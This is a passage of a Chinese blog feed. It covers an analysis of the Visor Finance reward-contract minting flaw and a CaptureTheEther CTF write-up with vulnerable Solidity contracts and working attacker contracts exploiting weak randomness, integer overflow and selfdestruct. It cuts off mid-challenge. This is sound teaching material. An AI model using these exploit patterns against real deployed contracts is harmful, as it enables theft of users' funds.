mint 的流动性代币发送到 0 地址或者此合约（Visor Finance RewardsHypervisor）的地址；</p></li><li><p>51-54行：如果代币<code>vvisr</code>代币的总供应量不为 0， 那么计算此合约中的 <code>visr</code>的余额（这个合约本身持有<code>visr</code>代币），根据比例计算出需要 <strong>mint</strong> 出的 <code>vvsir</code>的数量，53行为需要 <strong>mint</strong> 的 <code>vvsir</code>的数量<code>share = (visrDeposit / visrBalance) * vvisr总量</code>；</p><p><code>mul(x,y) = x * y, div(x, y) = x / y</code></p><p><code>share.mul(a) = share * a, share.div(a) = share / a</code></p></li><li><p>56-61行：判断发送<code>visr</code>的地址是否为合约地址，如果是合约地址，则检查 <strong>msg.sender</strong> 是不是合约的 <strong>owner</strong>，然后要求这个合约实现 <code>IVsior</code>接口，调用<code>from</code> 的<code>delegatedTransferERC20</code>函数，从<code>from</code>地址向当前合约地址发送<code>visrDeposit</code>数量的 visr。</p><p>由于对 <strong>from</strong> 未作出任何限定，所以 <strong>from</strong> 可以是任何合约。攻击者只需要定义一个<code>delegatedTransferERC20</code>函数就可以绕过充值直接 <strong>mint</strong>。</p></li><li><p>如果 <strong>from</strong> 不是合约地址，就调用 <code>visr.safeTransferFrom</code>函数，由于传入的 <strong>from</strong> 参数和 <strong>to</strong> 参数可控，意味着可以用别人授权给 <strong>RewardsHypervisor</strong> 合约的 <strong>visr</strong> 充值进去，再 <strong>mint vvisr</strong> 给自己。</p></li><li><p>转入<strong>vvisr</strong> 以后可以调用 <code>withdraw</code>函数将其转换成 <strong>visr</strong>，然后在市场上售卖完成变现。</p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220321132601411.png" alt="image-20220321132601411"></p></li></ol><p> <code>IVsior</code>接口说明：</p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220321113438989.png" alt="image-20220321113438989"></p><p> <code>IVsior</code>接口就是要求合约转账，这个函数的主要问题在于56-59行中，若传入的地址是合约，那么检测传入 <code>visr</code>的合约地址的 <strong>owner</strong> 是 <strong>msg.sender</strong> ，然后调用 <strong>from</strong> 的 <code>delegatedTransferERC20</code>函数，本意是检测 <strong>msg.sender</strong> 的授权转账。</p><ul><li><p><strong>问题 1:</strong></p><p>因为 <strong>from</strong> 可以是自己实现的合约，所以攻击者可以自己实现 <code>delegatedTransferERC20</code>函数，可以不实现转账并且满足<code>require</code>，并且<code>Hypervisior</code>合约本身就有钱，可以根据参数<code>visrDeposit</code>计算出最后 <strong>mint</strong> 出的 <code>vvisr</code>值发送给攻击者。</p></li><li><p><strong>问题 2:</strong></p><p>判断 <strong>from</strong> 不是合约地址时，<code>visr.safeTransferFrom</code>函数，由于传入的 <strong>from</strong> 参数和 <strong>to</strong> 参数可控，意味着可以用别人授权给 <strong>RewardsHypervisor</strong> 合约的 <strong>visr</strong> 充值进去，再 <strong>mint vvisr</strong> 最后发送给攻击者。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;攻击分析&quot;&gt;&lt;a href=&quot;#攻击分析&quot; class=&quot;headerlink&quot; title=&quot;攻击分析&quot;&gt;&lt;/a&gt;攻击分析&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83</summary>
      
    
    
    
    <category term="智能合约" scheme="https://banana69.site/categories/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    
    <category term="智能合约审计" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CaptureTheEther WriteUp</title>
    <link href="https://banana69.site/2022/03/17/capturetheether/"/>
    <id>https://banana69.site/2022/03/17/capturetheether/</id>
    <published>2022-03-17T07:21:46.000Z</published>
    <updated>2022-07-28T06:39:38.953Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Guess-the-secret-number"><a href="#Guess-the-secret-number" class="headerlink" title="Guess the secret number"></a>Guess the secret number</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheSecretNumberChallenge &#123;</span><br><span class="line">    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;</span><br><span class="line"></span><br><span class="line">    function GuessTheSecretNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        if (keccak256(n) == answerHash) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目需要猜一个uint8的变量经过keccak256后的值与answerHash相等，由于uint8的范围是0-255，所以写一个爆破的智能合约就可以解出最后的答案</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//爆破合约</span><br><span class="line">contract crack &#123;</span><br><span class="line">    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;</span><br><span class="line">    uint8 public result;</span><br><span class="line">   function crackresult() returns (uint8) &#123;</span><br><span class="line">     for (uint8 i = 0; i &lt;= 255; i++) &#123;</span><br><span class="line">         if (keccak256(i) == answerHash) &#123;</span><br><span class="line">             result = i;</span><br><span class="line">             return i;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">//result = 170</span><br></pre></td></tr></table></figure><h3 id="Guess-the-random-number"><a href="#Guess-the-random-number" class="headerlink" title="Guess the random number"></a>Guess the random number</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheRandomNumberChallenge &#123;</span><br><span class="line">    uint8 answer;</span><br><span class="line"></span><br><span class="line">    function GuessTheRandomNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        answer = uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        if (n == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题中的answer在构造函数中进行了初始化，所以根据solidity的存储结构，变量answer的值被存储在slot0中，此时的answer作为状态变量存储在storage中，所以可以使用web3js在微storage中读取</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">web3.js.getStorageAt(<span class="string">&quot;contract Address&quot;</span>, <span class="number">0</span>, <span class="built_in">console</span>.log)</span><br></pre></td></tr></table></figure><h3 id="Guess-the-new-number"><a href="#Guess-the-new-number" class="headerlink" title="Guess the new number"></a>Guess the new number</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheNewNumberChallenge &#123;</span><br><span class="line">    function GuessTheNewNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line"></span><br><span class="line">        if (n == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attacker &#123;</span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        uint8 result = uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line">        GuessTheNewNumberChallenge target = GuessTheNewNumberChallenge(0x4779f53F8141Ab6Aa7414CAB3A2184Cc4c32C56A);</span><br><span class="line">        target.guess.value(1 ether)(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public payable &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题需要获取到前一个区块的hash与当前的时间戳，由于每个区块包含很多个交易，而同一个区块的交易的前一个区块hash与时间戳都是相等的，所以可以通过部署另一个合约，从该合约调用目标合约中的guess函数使这俩个交易在一个块内。</p><h3 id="predict-the-future"><a href="#predict-the-future" class="headerlink" title="predict the future"></a>predict the future</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheFutureChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    uint8 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheFutureChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(uint8 n) public payable &#123;</span><br><span class="line">        require(guesser == 0);</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = n;</span><br><span class="line">        settlementBlockNumber = block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line">        guesser = 0;</span><br><span class="line">        if (guess == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题生成随机数的方式与上一题相同，不同点在于需要在<code>lockInGuess</code>函数处输入guess的值，然后<code>settlementBlockNumber</code>函数限制了在<code>settle()</code>函数中生成hash的块必须在<code>lockInGuess</code>块之后，所以无法直接调用<code>settle()</code>函数，由于最后获取hash值的方法为模10运算，因此answer的范围是0-9，因此可以利用爆破的方法来解决这道题。</p><p>思路：</p><ul><li>由于题目中锁定用户用的是<code>msg.sender</code>,所以需要部署一个攻击合约来随便猜一个数字，首先在攻击合约中调用<code>lockInGuess</code>函数，将猜的数字作为该函数的参数发送。</li><li>调用攻击合约中的爆破函数计算hash值与上一步猜的数字是否相等，当此块的信息得到的answer与我们猜的guess相同时我们再调用settle函数，以免guesser被清零。</li></ul><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract attacker &#123;</span><br><span class="line">    PredictTheFutureChallenge target;</span><br><span class="line">    uint public result;</span><br><span class="line">    function attacker() public payable &#123;</span><br><span class="line">        target = PredictTheFutureChallenge(0x1B67a75C3A4754d2586697722C36f181B7b82f5d);</span><br><span class="line">        target.lockInGuess.value(1 ether)(8);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function exploit() public payable &#123;</span><br><span class="line">        result = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line">            if (result == 8) &#123;</span><br><span class="line">            target.settle();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function () public payable &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Predict-the-block-hash"><a href="#Predict-the-block-hash" class="headerlink" title="Predict the block hash"></a>Predict the block hash</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheBlockHashChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    bytes32 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheBlockHashChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(bytes32 hash) public payable &#123;</span><br><span class="line">        require(guesser == 0);</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = hash;</span><br><span class="line">        settlementBlockNumber = block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line">        bytes32 answer = block.blockhash(settlementBlockNumber);</span><br><span class="line">        guesser = 0;</span><br><span class="line">        if (guess == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题与上一题基本类似，不一样的地方在于需要猜当前块的 hash，但是对于<code>block.blockhash</code>这个函数，可以获取给定区块号的 <strong>hash</strong> 值，但只支持最近的 256 个区块，对于 256 个区块之外的区块，<code>block.blockhash</code>函数都将返回 0，所以可以先传递 <code>guess</code>为 0，然后等待 256 个区块再调用<code>settle</code>函数即可，具体代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheBlockHashChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    bytes32 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheBlockHashChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(bytes32 hash) public payable &#123;</span><br><span class="line">        require(guesser == 0);</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = hash;</span><br><span class="line">        settlementBlockNumber = block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        bytes32 answer = block.blockhash(settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        guesser = 0;</span><br><span class="line">        if (guess == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attacker &#123;</span><br><span class="line"></span><br><span class="line">    PredictTheBlockHashChallenge target;</span><br><span class="line">    uint public result;</span><br><span class="line">    uint public num;</span><br><span class="line">    function attacker() public payable &#123;</span><br><span class="line">        target = PredictTheBlockHashChallenge(0xCF221473d9F6Ae7b95D47710776f5e7733C745F3);</span><br><span class="line">        target.lockInGuess.value(1 ether)(0);</span><br><span class="line">        num = block.number</span><br><span class="line">    &#125;</span><br><span class="line">    function exploit() public payable &#123;</span><br><span class="line">    if(block.number - num &gt; 256) &#123;</span><br><span class="line">            target.settle();</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function () public payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="Token-Sale"><a href="#Token-Sale" class="headerlink" title="Token Sale"></a>Token Sale</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenSaleChallenge &#123;</span><br><span class="line">//题目中定义了一个虚拟代币，通过mapping来追踪地址的代币数额</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    uint256 constant PRICE_PER_TOKEN = 1 ether;</span><br><span class="line">//和合约同名的构造函数，要求合约的初始余额为1 ether，</span><br><span class="line">    function TokenSaleChallenge(address _player) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line">//判断完成的条件要求合约中的余额小于 1 ether</span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &lt; 1 ether;</span><br><span class="line">    &#125;</span><br><span class="line">//定义了买入token的方法，买入后更新mapping</span><br><span class="line">    function buy(uint256 numTokens) public payable &#123;</span><br><span class="line">        require(msg.value == numTokens * PRICE_PER_TOKEN);</span><br><span class="line">        balanceOf[msg.sender] += numTokens;</span><br><span class="line">    &#125;</span><br><span class="line">//定义了卖出token的方法</span><br><span class="line">    function sell(uint256 numTokens) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= numTokens);</span><br><span class="line">        balanceOf[msg.sender] -= numTokens;</span><br><span class="line">        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先分析题目，题目中定义了一个虚拟代币，通过mapping来追踪地址的代币数额，<code>TokenSaleChallenge</code> 是和合约同名的构造函数，要求合约的初始余额为1 ether，当合约中的余额小于1 ether时完成题目。</p><p>由于买入多少币才能卖出多少币，所以如果想要能转出的买入的更多，就要求在买入的时候上溢，恰好这个合约没有safemath，存在溢出漏洞。</p><p>当买入的 token 小于 卖出的token 时可以利用溢出漏洞达到完成条件。</p><p>在<code>buy</code>函数中的的 判断<code>require(msg.value == numTokens * PRICE_PER_TOKEN);</code>，造成溢出需要当<code>msg.value</code>足够小，<code>numTokens</code>足够大，而 <code>PRICE_PER_TOKEN ==1 ether=10^18 wei</code>，所以当<code>numTokens * 10^18 &gt;= 2^256</code>时会上溢出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// msg.value == numTokens * PRICE_PER_TOKEN</span><br><span class="line">计算刚好造成上溢出的 numToken</span><br><span class="line">//这里不加1的话计算出来的msg.value会非常大无法发送（115792089237316195423570985008687907853269984665640564039457000000000000000000）</span><br><span class="line">numTokens = 2^256/(10^18) + 1 = 115792089237316195423570985008687907853269984665640564039458</span><br><span class="line">msg.value = numTokens * 10^18 % (2^256) = 415992086870360064 wei</span><br></pre></td></tr></table></figure><p>因为需要以<code>wei</code>为单位发送 ether，所以需要在 Remix 中部署合约，调用<code>buy</code> 函数相当于以较小的<code>msg.value</code>获取到了大量的<code>token</code>,而这些<code>token</code>可以在<code>sell</code>函数中能够以 1 ether 的兑换率被转出， 就相当于以 0.4 ether 充值了相当于 1 ther 的<code>token</code>最后将这些<code>token</code>卖出，合约中的余额就会减少 1 ether，就达成了完成的条件。</p><h3 id="Token-whale"><a href="#Token-whale" class="headerlink" title="Token whale"></a>Token whale</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenWhaleChallenge &#123;</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    string public name = &quot;Simple ERC20 Token&quot;;</span><br><span class="line">    string public symbol = &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals = 18;</span><br><span class="line"></span><br><span class="line">    function TokenWhaleChallenge(address _player) public &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        totalSupply = 1000;</span><br><span class="line">        balanceOf[player] = 1000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return balanceOf[player] &gt;= 1000000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    function _transfer(address to, uint256 value) internal &#123;</span><br><span class="line">        balanceOf[msg.sender] -= value; //利用此处的溢出</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line"></span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= value);</span><br><span class="line">        require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line"></span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value) public &#123;</span><br><span class="line">        allowance[msg.sender][spender] = value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[from] &gt;= value);</span><br><span class="line">        require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line">        require(allowance[from][msg.sender] &gt;= value);</span><br><span class="line"></span><br><span class="line">        allowance[from][msg.sender] -= value;</span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目中的代码是一个标准的 ERC20 标准代码 SET，当 player 即 msg.sender 的余额大于1000000 时完成题目，则需要<code>balanceof[msg.sender]</code>溢出。</p><p>观察主要存在以下几处风险：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">balanceOf[msg.sender] -= value; //27行可能存在下溢出，并且会更新msg.sender余额</span><br><span class="line">balanceOf[to] += value;//28行可能存在上溢出</span><br><span class="line">balanceOf[to] + value &gt;= balanceOf[to] //35行可能存在上溢出</span><br><span class="line">balanceOf[to] + value &gt;= balanceOf[to] //49行可能存在上溢出</span><br><span class="line">allowance[from][msg.sender] -= value;  //52行可能存在下溢出</span><br></pre></td></tr></table></figure><p>所以考虑实际可用的就是27行的下溢出：</p><ul><li><code>transfer()</code>函数调用了<code>_transfer()</code>函数，且存在溢出检查</li><li><code>transferFrom()</code>函数调用了<code>_transfer()</code>函数，不存在溢出检查，调用该函数需要调用<code>approve</code>函数批准转账额度</li></ul><p>逆向思考整个过程：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">要实现 27 行代码中 balanceOf[msg.sender] -= value; 这要求 msg.sender 的 mapping 里面的余额 &lt; value；</span><br><span class="line">_transfer函数应该调用msg.sender._transfer(to,value)，to为可控的account，value应该大于msg.sender的余额</span><br><span class="line">所以要先调用 msg.sender.transferFrom(to,any address,value)。第二个参数没有影响，相当于给这个地址增加token</span><br><span class="line">要求调用to.approve(msg.sender, value)</span><br></pre></td></tr></table></figure><p>所以这道题的解题流程是：</p><ol><li><p>引入一个可控的地址 <strong>to</strong> （需要用该地址发起交易）；</p></li><li><p>调用<code>transfer</code>函数给地址 <strong>to</strong> 转入一些 token，导致 player 的<code>token &lt; value</code>，且<code>value &lt; totalsupply</code>，当 player 的<code>token &lt; value</code>时可以造成下溢出；</p><p><img src="/image/capturetheether.assets/image-20220324164724573.png" alt="image-20220324164724573"></p><p>此时的<code>balanceOf[to]=800,balanceOf[msg.sender]=200</code></p></li><li><p>调用函数<code>to.approve(msg.sender, 800</code>);</p><p><img src="/image/capturetheether.assets/image-20220324163947646.png" alt="image-20220324163947646"></p><p>此时<code>allowance[to][msg.sender]=800</code></p></li><li><p>调用函数<code>msg.sender.transferFrom(to, this, 500);  </code>//选择当前合约地址作为接受 token 的地址</p><p><img src="/image/capturetheether.assets/image-20220324164309172.png" alt="image-20220324164309172"></p><p>在这里<code>address from = address to</code>，调用该函数时只比较了<code>balanceof[to] &gt; value</code>，且<code>allowance[to][msg.sender]=800 &gt; 500</code> 通过验证</p></li><li><p>执行代码<code>msg.sender._transfer(this, 500)</code>;</p></li><li><p>执行代码<code>balanceOf[msg.sender]-=500</code>造成下溢;</p></li><li><p>最终结果</p><p><img src="/image/capturetheether.assets/image-20220324164424093.png" alt="image-20220324164424093"></p></li></ol><h3 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a>Retirement fund</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract RetirementFundChallenge &#123;</span><br><span class="line">    uint256 startBalance;</span><br><span class="line">    address owner = msg.sender;</span><br><span class="line">    address beneficiary;</span><br><span class="line">    uint256 expiration = now + 10 years;</span><br><span class="line"></span><br><span class="line">    function RetirementFundChallenge(address player) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        beneficiary = player;</span><br><span class="line">        startBalance = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        if (now &lt; expiration) &#123;</span><br><span class="line">            // early withdrawal incurs a 10% penalty</span><br><span class="line">            msg.sender.transfer(address(this).balance * 9 / 10);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            msg.sender.transfer(address(this).balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectPenalty() public &#123;</span><br><span class="line">        require(msg.sender == beneficiary);</span><br><span class="line">//startBalance = 1 ether,address(this).balance = 1 ether ,withdrawn = 0</span><br><span class="line">        uint256 withdrawn = startBalance - address(this).balance;</span><br><span class="line"></span><br><span class="line">        // an early withdrawal occurred</span><br><span class="line">        require(withdrawn &gt; 0);</span><br><span class="line"></span><br><span class="line">        // penalty is what&#x27;s left</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当合约地址的余额为0时挑战成功，所以需要找到一个方法从合约中向外转钱。</p><p>该合约中存在一个转账方法<code>&lt;address&gt;.transfer(uint256 amount)</code>，转账的单位为 wei，转账的同时传输 2300 的gas且gas数量不可调整，该合约只有俩个函数会调用<code>transfer</code>方法：<code>withdraw 和 collectPenalty</code>函数，而在<code>withdraw()</code>函数中要求<code>require(msg.sender == owner);</code>，此时的 owner 是Capture the Ether factory contract，所以我们无法通过<code>require</code>判断，只能调用<code>collectPenalty</code>函数中的 <code>thransfer</code> 方法。</p><p>所以整个流程为：</p><ol><li>调用<code>collectPenalty</code>函数，通过判断<code>require(msg.sender == beneficiary)</code>;</li><li>执行<code>withdrawn = startBalance - address(this).balance;</code></li><li>判断 <code>withdrawn &gt;0</code>;</li><li>执行<code>msg.sender.transfer(address(this).balance);</code></li></ol><p>在第二部中由于<code>startBalance = 1 ether,address(this).balance = 1 ether ,withdrawn = 0</code>,无法使<code>withdrawn &gt;0</code>,所以可以通过部署一个合约，使用 <strong>selfdestruct</strong> 方法将该合约中的钱转入<code>RetirementFundChallenge</code>合约，当转入钱以后,<code>starttBalance = 1, address(this).balance &gt; 1</code>，此时就会造成下溢出，使其通过<code>withdrawn &gt; 0</code>的判断，最后使用  <code>thransfer</code> 方法将合约中的钱全部转出。</p><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.7.3;</span><br><span class="line">contract Attack &#123;</span><br><span class="line">constructor(address payable target) payable &#123;</span><br><span class="line">require(msg.value &gt; 0);</span><br><span class="line">selfdestruct(target);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract MappingChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line">    uint256[] map;</span><br><span class="line"></span><br><span class="line">    function set(uint256 key, uint256 value) public &#123;</span><br><span class="line">        // Expand dynamic array as needed</span><br><span class="line">        if (map.length &lt;= key) &#123;</span><br><span class="line">            map.length = key + 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        map[key] = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function 